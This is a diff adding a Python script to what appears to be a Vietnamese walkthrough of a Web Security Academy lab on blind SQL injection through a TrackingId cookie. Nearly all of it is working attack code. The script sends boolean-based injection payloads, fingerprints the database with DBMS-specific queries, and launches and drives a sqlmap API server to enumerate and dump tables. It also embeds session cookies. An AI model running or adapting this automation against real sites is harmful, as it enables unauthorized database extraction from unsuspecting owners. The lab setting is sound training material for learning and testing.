@@ -61,5 +61,256 @@
 * **2. Tìm cách khai thác**
 
 
+```python
+import subprocess
+import time
+import requests
+import sys
+from urllib.parse import urljoin, urlencode
+import urllib3
 
+# Tắt cảnh báo SSL không an toàn
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Đường dẫn đến file sqlmapapi.py trên máy của bạn
+SQLMAPAPI_PATH = r"C:\sqlmap\sqlmapapi.py"
+PORT = "8775"
+API_URL = f"http://127.0.0.1:{PORT}"
+
+API_USER = "admin"
+API_PASS = "securepassword123"
+
+# ======================= [BẮT ĐẦU] PASTE CODE TỪ CURLCONVERTER VÀO ĐÂY =======================
+# (Thay thế các thông tin dưới đây bằng request thực tế của bạn)
+
+import requests
+
+cookies = {
+    'TrackingId': 'WxyBJEuPg4QS8ymG',
+    'session': '8QggNQddnM0ygUpjfmY8n2HUfVWMpUMC',
+}
+
+headers = {
+    'Host': '0ad400d60328635d82bd7432000a0094.web-security-academy.net',
+    'Sec-Ch-Ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
+    'Sec-Ch-Ua-Mobile': '?0',
+    'Sec-Ch-Ua-Platform': '"Windows"',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-User': '?1',
+    'Sec-Fetch-Dest': 'document',
+    'Referer': 'https://0ad400d60328635d82bd7432000a0094.web-security-academy.net/filter?category=Pets',
+    # 'Accept-Encoding': 'gzip, deflate, br',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Priority': 'u=0, i',
+    # 'Cookie': 'TrackingId=WxyBJEuPg4QS8ymG; session=8QggNQddnM0ygUpjfmY8n2HUfVWMpUMC',
+}
+
+params = {
+    'category': 'Pets',
+}
+
+
+referer = headers.get('Referer', '')
+url = urljoin(referer, '/filter')
+
+# ======================= [KẾT THÚC] PASTE CODE TỪ CURLCONVERTER =======================
+
+
+# --------------------------------------------------------------------------------------
+# CÁC HÀM KIỂM TRA THỦ CÔNG CỦA BẠN (Dùng để tối ưu hóa đầu vào cho SQLMap)
+# --------------------------------------------------------------------------------------
+
+DEFAULT_TRUE_INDICATOR = "Welcome back!"
+DEFAULT_INJECT_IN = "cookies"
+DEFAULT_INJECT_IN_KEY = "TrackingId"
+
+def check_boolean_base_sqli(payload, inject_in=DEFAULT_INJECT_IN, key=DEFAULT_INJECT_IN_KEY, indicator=DEFAULT_TRUE_INDICATOR):
+    req_args = {
+        "headers": headers.copy(),
+        "cookies": cookies.copy(),
+        "params": params.copy()
+    }
+    target_dict = req_args.get(inject_in)
+    if target_dict:
+        base_val = target_dict.get(key, "")
+        target_dict[key] = f"{base_val}{payload}".strip()
+
+    try:
+        response = requests.get(url, verify=False, **req_args)
+        return indicator in response.text
+    except Exception as e:
+        print(f"\n[-] Connection Error: {e}")
+        return False
+
+def identify_dbms():
+    print("[*] Đang xác định hệ quản trị cơ sở dữ liệu (DBMS)...")
+    
+    # Thử PostgreSQL
+    pg_payload = "' AND EXISTS(SELECT * FROM pg_catalog.pg_class) -- "
+    if check_boolean_base_sqli(pg_payload):
+        print("[+] Xác định DBMS: PostgreSQL")
+        return "PostgreSQL"
+    
+    # Thử Oracle
+    oracle_payload = "' AND EXISTS(SELECT banner FROM v$version) -- "
+    if check_boolean_base_sqli(oracle_payload):
+        print("[+] Xác định DBMS: Oracle")
+        return "Oracle"
+    
+    # Thử MySQL
+    mysql_payload = "' AND @@version_comment IS NOT NULL -- "
+    if check_boolean_base_sqli(mysql_payload):
+        print("[+] Xác định DBMS: MySQL")
+        return "MySQL"
+
+    # Thử Microsoft SQL Server
+    mssql_payload = "' AND EXISTS(SELECT * FROM sys.objects) -- "
+    if check_boolean_base_sqli(mssql_payload):
+        print("[+] Xác định DBMS: Microsoft SQL Server")
+        return "Microsoft SQL Server"
+
+    print("[-] Không xác định chắc chắn được DBMS.")
+    return None
+
+
+# --------------------------------------------------------------------------------------
+# HÀM CẤU HÌNH SQLMAP (ĐÃ TỐI ƯU HÓA)
+# --------------------------------------------------------------------------------------
+
+def build_sqlmap_options(detected_dbms):
+    if params:
+        full_url = f"{url}?{urlencode(params)}"
+    else:
+        full_url = url
+
+    cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
+
+    ignored_headers = ['host', 'cookie']
+    headers_list = [f"{k}: {v}" for k, v in headers.items() if k.lower() not in ignored_headers]
+    headers_str = "\n".join(headers_list)
+
+    options = {
+        "url": full_url,
+        "cookie": cookie_str,
+        "headers": headers_str,
+        "batch": True,
+        
+        # --- BƯỚC KHAI THÁC MỤC TIÊU (DUMP DỮ LIỆU) ---
+        "getTables": True,               # Yêu cầu lấy danh sách bảng của Database hiện tại
+        # "commonTables": True,          # Hoặc bạn có thể dùng để brute-force bảng nếu DBMS là PostgreSQL/Oracle
+        
+        # --- ĐIỀU CHỈNH ĐỂ KHÔNG ĐOÁN DBMS VÀ KỸ THUẬT ---
+        "level": 2,                      # Bắt buộc vì lỗi nằm ở Cookie
+        "testParameter": "TrackingId",   # Chỉ quét đúng tham số này
+        "technique": "B",                     # Ép sqlmap CHỈ dùng kỹ thuật Boolean-based blind, bỏ qua 5 kỹ thuật khác
+        "threads": "5",
+    }
+
+    # Nếu hàm tự viết của bạn tìm ra DBMS, truyền thẳng vào đây để sqlmap không quét đoán DBMS nữa
+    if detected_dbms:
+        options["dbms"] = detected_dbms
+
+    return options
+
+
+# --------------------------------------------------------------------------------------
+# TIẾN TRÌNH CHẠY CHÍNH
+# --------------------------------------------------------------------------------------
+
+if __name__ == "__main__":
+    # 1. Chạy hàm kiểm tra lỗi của bạn trước
+    print("[*] Đang khởi chạy tiền kiểm tra lỗi...")
+    if not check_boolean_base_sqli(payload="' AND 1=1 -- "):
+        print("[-] Kiểm tra thất bại. Vui lòng xác thực lại Session/Cookie!")
+        sys.exit(1)
+    print("[+] Xác nhận lỗi SQL Injection hoạt động tốt.")
+
+    # 2. Chạy hàm nhận diện DBMS của bạn
+    detected_dbms = identify_dbms()
+
+    # 3. Khởi động SQLMap Server ngầm
+    print("\n[+] Đang khởi động SQLMap API Server ngầm...")
+    try:
+        api_process = subprocess.Popen(
+            [sys.executable, SQLMAPAPI_PATH, "-s", "-p", PORT, "--username", API_USER, "--password", API_PASS],
+            stdout=subprocess.DEVNULL, 
+            stderr=subprocess.DEVNULL
+        )
+        time.sleep(3)
+    except Exception as e:
+        print(f"[-] Không thể bật SQLMap API: {e}")
+        sys.exit(1)
+
+    try:
+        auth_cred = (API_USER, API_PASS)
+
+        # Tạo Task
+        response = requests.get(f"{API_URL}/task/new", auth=auth_cred)
+        task_id = response.json().get("taskid")
+        print(f"[+] Đã tạo Task ID: {task_id}")
+
+        # Nạp cấu hình tối ưu hóa dựa trên DBMS đã nhận diện được ở Bước 2
+        scan_options = build_sqlmap_options(detected_dbms)
+
+        # Khởi động quét
+        requests.post(f"{API_URL}/scan/{task_id}/start", json=scan_options, auth=auth_cred)
+        print(f"[+] Đang yêu cầu SQLMap trích xuất cấu trúc dữ liệu...")
+
+        # 4. Theo dõi trạng thái và in kết quả thời gian thực
+        last_log_index = 0  # Biến lưu vị trí log cuối cùng đã đọc
+        
+        while True:
+            # Lấy trạng thái quét
+            status_data = requests.get(f"{API_URL}/scan/{task_id}/status", auth=auth_cred).json()
+            status = status_data.get("status")
+            
+            # Lấy toàn bộ log từ đầu đến hiện tại
+            log_data = requests.get(f"{API_URL}/scan/{task_id}/log", auth=auth_cred).json()
+            logs = log_data.get("log", [])
+            
+            # Nếu có log mới phát sinh kể từ lần kiểm tra trước
+            if len(logs) > last_log_index:
+                for i in range(last_log_index, len(logs)):
+                    msg = logs[i].get("message", "")
+                    
+                    # Nếu phát hiện dòng log chứa dữ liệu đã được giải mã (retrieved)
+                    if "retrieved:" in msg.lower():
+                        # Làm nổi bật dòng chứa kết quả tìm được
+                        print(f"\n[★ TÌM THẤY] {msg}\n")
+                    else:
+                        # In các log tiến trình thông thường của SQLMap
+                        print(f"[SQLMap Log] {msg}")
+                
+                # Cập nhật lại chỉ số log đã đọc để tránh in trùng lặp
+                last_log_index = len(logs)
+                
+            if status == "terminated":
+                print("[+] SQLMap đã quét xong hoàn toàn!")
+                break
+                
+            # Đợi 2 giây trước khi cập nhật tiếp (giảm từ 4s xuống 2s để hiển thị mượt hơn)
+            time.sleep(2)
+
+        # Xuất dữ liệu cuối cùng
+        data_resp = requests.get(f"{API_URL}/scan/{task_id}/data", auth=auth_cred).json()
+        print("\n" + "="*20 + " KẾT QUẢ TỪ SQLMAP " + "="*20)
+        results = data_resp.get("data", [])
+        if results:
+            for item in results:
+                if "value" in item:
+                    print(item["value"])
+        else:
+            print("[-] Không tìm thấy dữ liệu mong muốn.")
+            
+    finally:
+        # Tắt server ngầm giải phóng cổng
+        print("\n[+] Đang tắt SQLMap API Server...")
+        api_process.terminate()
+        api_process.wait()
+        print("[+] Đã dọn dẹp hệ thống sạch sẽ.")
+```
   
